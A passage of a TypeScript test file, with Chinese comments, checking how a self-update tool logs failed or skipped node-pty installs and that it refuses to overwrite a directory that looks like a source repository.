    expect(logs.info.join('\n')).toContain('完整模式');
  });

  it('logs the reason when npm ran and failed', () => {
    const logs = report({
      ok: true,
      version: '0.2.0',
      pty: { attempted: true, ok: false, error: 'npm 退出码 3: preinstall script failed' },
    });

    expect(logs.info.join('\n')).not.toContain('完整模式');
    expect(logs.warn.join('\n')).toContain('安装失败');
    expect(logs.warn.join('\n')).toContain('退出码 3');
  });

  /**
   * 「未执行」同样必须留痕:白名单挡下可疑范围时终端一样是受限的,
   * 只记 attempted=true 的那一支就等于把这条降级重新变回静默。
   */
  it('logs the reason even when npm was never invoked', () => {
    const logs = report({
      ok: true,
      version: '0.2.0',
      pty: { attempted: false, ok: false, error: '包声明的 node-pty 版本范围不适合作为命令行参数执行,已跳过安装' },
    });

    expect(logs.info.join('\n')).not.toContain('完整模式');
    expect(logs.warn.join('\n')).toContain('未安装');
    expect(logs.warn.join('\n')).toContain('已跳过安装');
  });
});

describe('源码仓库护栏', () => {
  it('目标目录疑似源码仓库时拒绝整包替换,源码原样保留', async () => {
    const work = mkdtempSync(join(tmpdir(), 'syncx-test-guard-'));
    // 造一个「仓库根」:含 src/main.ts,整包替换会把它删掉
    const repo = join(work, 'repo');
    mkdirSync(join(repo, 'src'), { recursive: true });
    writeFileSync(join(repo, 'src', 'main.ts'), '// source entry\n');
    makeFakePackage(work, 'newpkg', '0.2.0');
    const tgz = tgzDir(join(work, 'newpkg'));

    await expect(
      runSelfUpdate(tgz, '0.2.0', { targetDir: repo, minBytes: 16, verify: false }),
    ).rejects.toThrow('源码仓库');

    // 关键:拒绝必须是「什么都没动」,源码原样保留
    expect(existsSync(join(repo, 'src', 'main.ts'))).toBe(true);
    rmSync(work, { recursive: true, force: true });
  });
});
